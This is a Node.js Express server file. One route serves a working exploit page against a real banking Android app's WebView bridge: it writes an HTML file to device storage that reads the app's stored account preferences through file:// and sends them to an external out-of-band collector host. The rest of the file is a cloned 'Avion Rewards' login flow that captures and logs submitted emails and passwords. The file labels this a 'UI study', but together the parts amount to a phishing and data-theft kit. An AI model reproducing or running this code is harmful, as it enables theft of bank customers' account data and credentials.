const express = require("express");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

app.disable("x-powered-by");
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/exploit.html", (_req, res) => {
  res.type('html').send(`<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
<p id="status">Starting...</p>
<script>
var SERVER = "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun";

function log(step) {
    document.getElementById("status").innerText = step;
    new Image().src = SERVER + "/log?step=" + encodeURIComponent(step);
}

// Step 1: Confirm the page loaded at all
log("1-page-loaded");

// Step 2: Check if the JS bridge exists
if (typeof WebViewFragment === "undefined") {
    log("FAIL-no-bridge");
} else {
    log("2-bridge-exists");

    // Step 3: Try DYNAMIC_DOWNLOAD_DOCUMENT
    try {
        var testHtml = '<html><body><p>Verifying your identity...</p><script>' +
            'var stolen = "placeholder";' +
            'var target = "/data/data/com.rbc.mobile.android/shared_prefs/accounts.xml";' +
            'var xhr = new XMLHttpRequest();' +
            'xhr.open("GET", "file://" + target, true);' +
            'xhr.onreadystatechange = function() {' +
            '  if (xhr.readyState === 4) {' +
            '    if (xhr.status === 0 || xhr.status === 200) {' +
            '      stolen = xhr.responseText;' +
            '    }' +
            '    var data = encodeURIComponent(JSON.stringify(stolen));' +
            '    WebViewFragment.onNavigateWebHook(JSON.stringify({' +
            '      "version": "1.2",' +
            '      "type": "externalWebview",' +
            '      "destination": "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun/collect?d=" + data' +
            '    }));' +
            '  }' +
            '};' +
            'xhr.send();' +
            '<\\/script></body></html>';

        WebViewFragment.onFeatureEventWebHook(JSON.stringify({
            "version": "1.2",
            "type": "dynamicDownloadDocument",
            "targetFileBase64": btoa(testHtml),
            "fileName": "verify.html"
        }));
        log("3-download-called");
    } catch(e) {
        log("FAIL-download-error-" + e.message);
    }

    // Step 4: Navigate to file after short delay
    setTimeout(function() {
        log("4-about-to-navigate");
        setTimeout(function() {
            window.location = "file:///storage/emulated/0/Android/data/com.rbc.mobile.android/files/verify.html";
        }, 500);
    }, 1500);
}
</script>
</body>
</html>`);
});

app.get('/test.txt', function (req, res) {
  res.type('text/plain');
  res.send('test');
});

app.get("/login/identifier", (_req, res) => {
  res.send(renderPage({ step: "identifier" }));
});

app.get("/login/password", (req, res) => {
  const email = typeof req.query.email === "string" ? req.query.email : "";
  res.send(renderPage({ step: "password", email }));
});

app.post("/login/complete", (req, res) => {
  const username = typeof req.body.email === "string" ? req.body.email : "";
  const password = typeof req.body.password === "string" ? req.body.password : "";

  logTestLoginCapture(username, password);

  res.redirect("/login/complete");
});

app.get("/login/complete", (_req, res) => {
  res.send(renderPage({ step: "complete" }));
});

if (require.main === module) {
  app.listen(port, () => {
    console.log(`Login UI study running at http://localhost:${port}`);
  });
}

function renderPage({ step, email = "" }) {
  const content = {
    identifier: renderIdentifierStep(),
    password: renderPasswordStep(email),
    complete: renderCompleteStep()
  }[step];

  return `<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Avion Rewards Login UI Study</title>
    <meta name="description" content="A local two-step login UI sample for design study.">
    <link rel="stylesheet" href="/styles.css">
    <script src="/app.js" defer></script>
  </head>
  <body>
    <a class="skip-link" href="#main">Skip to main content</a>
    <main id="main" class="page-shell">
      <section class="auth-card" aria-labelledby="page-title">
        <div class="brand-mark" aria-hidden="true">A</div>
        ${content}
      </section>
    </main>
    <aside class="cookie-banner" data-cookie-banner aria-label="Cookie notice">
      <p>
        To ensure you have the best possible experience, we use cookies and similar technologies on our sites.
        Some are necessary for helping our sites run smoothly and securely, others are optional and help us
        create customized experiences.
      </p>
      <div class="cookie-actions">
        <button class="button cookie-primary" type="button" data-accept-cookies>Accept All Cookies</button>
        <button class="button cookie-secondary" type="button">Manage Cookie Settings</button>
      </div>
      <button class="cookie-close" type="button" aria-label="Close cookie notice" data-accept-cookies></button>
    </aside>
  </body>
</html>`;
}

function renderIdentifierStep() {
  return `<h1 id="page-title">Welcome back<span aria-hidden="true"> 👋</span></h1>
        <p class="lede">Sign in to Avion Rewards with your email address.</p>
        <form class="auth-form" action="/login/password" method="get" data-email-form novalidate>
          <div class="field" data-field>
            <input id="email" name="email" type="email" autocomplete="email" placeholder=" " required aria-describedby="email-error">
            <label for="email">Email*</label>
          </div>
          <p class="field-error" id="email-error" aria-live="polite"></p>
          <button class="button primary-button" type="submit">Continue</button>
        </form>
        <p class="join-copy">Not an Avion Rewards member?<br><a href="#">Join now</a></p>`;
}

function renderPasswordStep(email) {
  const safeEmail = escapeHtml(email || "learner@example.com");

  return `<h1 id="page-title">Enter your password</h1>
        <p class="lede">To continue, enter your password for Avion Rewards.</p>
        <div class="email-chip">
          <span>${safeEmail}</span>
          <a href="/login/identifier">Edit</a>
        </div>
        <form class="auth-form" action="/login/complete" method="post" data-password-form novalidate>
          <input type="hidden" name="email" value="${safeEmail}">
          <div class="field password-field" data-field>
            <input id="password" name="password" type="password" autocomplete="current-password" placeholder=" " required aria-describedby="password-error">
            <label for="password">Password*</label>
            <button class="show-password" type="button" aria-label="Show password" aria-pressed="false" data-toggle-password>
              <span aria-hidden="true"></span>
            </button>
          </div>
          <p class="field-error" id="password-error" aria-live="polite"></p>
          <p class="forgot-copy"><a href="#">Forgot password?</a></p>
          <button class="button primary-button" type="submit">Continue</button>
        </form>
        <p class="join-copy">Not an Avion Rewards member?<br><a href="#">Join now</a></p>`;
}

function renderCompleteStep() {
  return `<h1 id="page-title">Demo complete</h1>
        <p class="lede">This sample stops here. It does not authenticate, create a session, or store credentials.</p>
        <a class="button primary-button link-button" href="/login/identifier">Start again</a>`;
}

function escapeHtml(value) {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function logTestLoginCapture(username, password) {
  console.log("[TEST LOGIN CAPTURE] Testing purposes only. These fields are from this local UI study and do not correspond to an actual production username or password.", {
    username,
    password
  });
}

module.exports = { app, logTestLoginCapture };
